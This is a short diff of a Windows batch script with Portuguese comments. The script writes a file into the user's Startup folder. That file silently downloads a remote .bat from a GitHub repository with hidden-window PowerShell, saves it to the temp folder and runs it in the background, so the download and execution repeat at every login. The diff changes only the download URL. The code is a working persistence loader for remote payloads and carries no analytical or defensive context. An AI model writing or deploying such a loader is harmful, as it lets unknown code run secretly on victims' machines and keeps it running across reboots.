@@ -4,7 +4,7 @@ set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 :: Criar o arquivo de inicialização
 (
 echo @echo off
-echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ.bat"
+echo set "url=https://github.com/lcmandrikion-hash/LZX/blob/main/LZX.bat"
 echo set "arquivo=%%TEMP%%\LZX.bat"
 echo powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%'"
 echo start /B "" "%%arquivo%%"
